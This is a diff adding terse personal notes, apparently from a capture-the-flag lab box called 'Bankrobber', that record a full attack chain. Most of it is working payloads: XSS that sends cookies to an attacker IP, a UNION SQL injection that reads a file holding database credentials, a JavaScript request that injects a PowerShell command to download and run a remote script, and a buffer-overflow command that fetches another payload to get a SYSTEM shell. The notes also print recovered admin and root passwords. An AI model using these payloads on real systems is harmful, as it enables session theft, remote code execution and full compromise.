@@ -1,0 +1,92 @@
+OS:
+- Windows 10 
+
+
+Open Ports:
+- Not shown: 65531 filtered ports
+- PORT     STATE SERVICE
+- 80/tcp   open  http
+- 443/tcp  open  https
+- 445/tcp  open  microsoft-ds
+- 3306/tcp open  mysql
+
+
+- enumerating port 445
+- crackmapexec
+
+BANKROBBER    [*] Windows 10 Pro 14393 (name:BANKROBBER) (domain:Bankrobber) (signing:False) (SMBv1:True)
+
+- enumerating port 80
+- in /phpmyadmin, found:
+Access to the requested object is only available from the local network.
+This setting can be configured in the file "httpd-xampp.conf".
+
+- found reflected XSS in https://10.10.10.154/user/
+- reviewing browser cookies
+- shows user/password
+- adding xss payload:
+<script>document.location='http://10.10.14.9/XSS/grabber.php?c='%2bdocument.cookie</script>
+
+- did not work. trying another payload:
+<img src=x onerror=this.src='http://10.10.14.9/?cookies='+btoa(document.cookie)
+/>
+
+10.10.10.154 - - [08/Jan/2021 21:14:14] "GET /?cookies=dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== HTTP/1.1" 200 - 
+
+
+- base64 user/password:
+admin
+Hopelessromantic
+
+
+DB Tables:
+bankrobber
+information_schema
+mysql
+performance_schema
+phpmyadmin
+test
+
+Columns in Users table:
+users:id
+,users:username
+,users:password
+,users:USER
+,users:CURRENT_CONNECTIONS
+,users:TOTAL_CONNECTIONS
+
+- checking backdoorchecker.php
+- shows include to link.php
+
+term=1' UNION SELECT 1,LOAD_FILE('C:/xampp/htdocs/link.php'),3 -- -
+- found creds:
+$user = 'root';
+$pass = 'Welkom1!';
+$dsn = "mysql:host=127.0.0.1;dbname=bankrobber;";
+
+- using payload to POST request to backdoorchecker.php:
+var xhr = new XMLHttpRequest();
+var url = "http://localhost/admin/backdoorchecker.php";
+var params = 'cmd=dir | powershell "IEX(new-object Net.WebClient).downloadString(\'http://10.10.14.9/payload.ps1\')"';
+xhr.open("POST", url);
+xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send(params);
+
+- executing payload with:
+<script src=http://10.10.14.9/payloadthree.js></script>
+
+- got reverse shell
+- running priv esc scripts
+- found port: 910 on target machine
+- used chisel to port forward to local machine
+- nc to that port on localhost
+- requires 4 digit pin, ran python script with pwntools to brute force
+- found pin: 0021
+
+- attempting to brute force input in application
+- seems to be executing after the first 32 characters
+- ran cmd:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApowershell "IEX(new-object Net.WebClient).downloadString('http://10.10.14.9/i.ps1')"
+
+- got reverse shell as system
